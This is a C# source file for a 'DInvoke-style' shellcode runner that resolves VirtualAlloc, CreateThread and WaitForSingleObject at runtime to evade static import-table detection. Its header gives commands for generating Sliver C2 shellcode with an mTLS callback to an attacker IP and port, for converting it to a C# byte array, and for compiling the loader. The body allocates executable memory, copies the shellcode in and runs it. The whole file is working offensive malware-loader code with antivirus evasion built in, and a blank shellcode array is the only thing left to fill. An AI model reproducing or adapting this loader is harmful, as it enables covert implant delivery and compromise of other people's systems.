// =============================================================================
// DInvoke-style shellcode runner
//
// Resolves VirtualAlloc / CreateThread / WaitForSingleObject at runtime via
// GetModuleHandle + GetProcAddress instead of declaring them as static P/Invoke.
// This keeps the functions out of the managed import table, defeating static
// IAT-based detection of the API usage.
//
// Shellcode (Sliver):
//   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
//   python3 ../../sliver/sliver2arrays.py /tmp/sc.bin --csharp
//
// Compile (Release, x64):
//   csc /target:exe /platform:x64 /optimize+ /out:dinvoke-runner.exe dinvoke-runner.cs
// =============================================================================

using System;
using System.Runtime.InteropServices;

namespace DInvokeRunner
{
    class Program
    {
        // Only kernel32's resolver functions are imported statically — everything
        // else is resolved at runtime through these.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        static IntPtr Resolve(string module, string function)
        {
            IntPtr h = GetModuleHandle(module);
            if (h == IntPtr.Zero) return IntPtr.Zero;
            return GetProcAddress(h, function);
        }

        // Delegate signatures for the APIs we resolve at runtime
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr VirtualAllocDel(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr CreateThreadDel(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint WaitForSingleObjectDel(IntPtr hHandle, uint dwMilliseconds);

        static void Main(string[] args)
        {
            // ── Paste your shellcode here (from sliver2arrays.py --csharp) ─────
            byte[] buf = new byte[] { /* shellcode bytes */ };
            // ───────────────────────────────────────────────────────────────────

            var valloc = (VirtualAllocDel)Marshal.GetDelegateForFunctionPointer(
                Resolve("kernel32.dll", "VirtualAlloc"), typeof(VirtualAllocDel));
            var cthread = (CreateThreadDel)Marshal.GetDelegateForFunctionPointer(
                Resolve("kernel32.dll", "CreateThread"), typeof(CreateThreadDel));
            var wait = (WaitForSingleObjectDel)Marshal.GetDelegateForFunctionPointer(
                Resolve("kernel32.dll", "WaitForSingleObject"), typeof(WaitForSingleObjectDel));

            if (valloc == null || cthread == null || wait == null)
            { Console.WriteLine("[-] Failed to resolve one or more APIs"); return; }

            IntPtr addr = valloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr hThread = cthread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            wait(hThread, 0xFFFFFFFF);
        }
    }
}
